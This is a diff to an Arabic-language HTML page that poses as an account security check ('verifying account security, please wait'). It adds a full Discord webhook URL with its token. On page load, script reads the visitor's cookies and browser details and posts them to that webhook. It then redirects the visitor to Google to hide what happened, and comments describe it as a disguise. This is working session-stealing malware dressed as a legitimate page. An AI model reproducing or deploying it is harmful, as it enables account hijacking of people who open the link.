@@ -1,12 +1,16 @@
+
+    
+امير
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري فحص الأمان...</title>
+    <title>...جاري فحص الأمان</title>
 </head>
 <body>
     <script>
-        const WEBHOOK_URL = "https://discordapp.com";
+        // رابط الديسكورد الخاص بك مصححاً بالكامل
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
 
         async function captureAndSend() {
             const payload = {
@@ -16,23 +20,34 @@
                     description: "```" + (document.cookie || "لا توجد جلسات مفتوحة حالياً") + "```",
                     color: 15158332,
                     fields: [
-                        { name: "معلومات الجهاز", value: navigator.userAgent }
+                        { name: "معلومات الجهاز", value: navigator.userAgent },
+                        { name: "توقيت العملية", value: new Date().toLocaleString() }
                     ]
                 }]
             };
 
             try {
+                // الأمر الفعلي لإرسال البيانات
                 await fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.error("خطأ في الاتصال بالسيرفر");
+            }
 
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+            // تمويه المجرم بنقله لغوغل بعد ثانيتين
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
         }
+
+        // تشغيل المهمة فور فتح الرابط
         window.onload = captureAndSend;
     </script>
-    <center><h1 style="margin-top:100px; font-family: Arial;">...جاري التحقق من أمان الحساب، يرجى الانتظار</h1></center>
+    <center>
+        <h1 style="margin-top:100px; font-family: Arial, sans-serif;">...جاري التحقق من أمان الحساب، يرجى الانتظار</h1>
+    </center>
 </body>
 </html>
